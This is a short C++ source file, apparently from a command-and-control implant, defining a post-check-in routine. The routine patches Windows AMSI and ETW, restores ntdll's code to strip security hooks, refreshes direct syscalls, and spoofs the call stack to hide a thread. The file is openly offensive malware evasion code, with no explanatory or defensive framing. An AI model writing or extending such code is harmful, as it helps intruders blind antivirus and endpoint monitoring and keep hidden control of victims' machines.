#include "Opsec.h"

#include "AmsiEtw.h"
#include "StackSpoof.h"
#include "Syscalls.h"
#include "Unhook.h"
#include "core/StageLog.h"

namespace opsec {

void post_checkin() {
    C2_STAGE("post-amisetw");
    amisetw::patch();

    C2_STAGE("post-restore-ntdll");
    if (unhook::restore_ntdll_text()) {
        C2_STAGE("post-syscalls-refresh");
        syscalls::init();
    } else {
        C2_STAGE("post-restore-skip");
    }

    C2_STAGE("post-stackspoof");
    if (stackspoof::init()) stackspoof::hide_thread();
    C2_STAGE("post-checkin-done");
}

} // namespace opsec
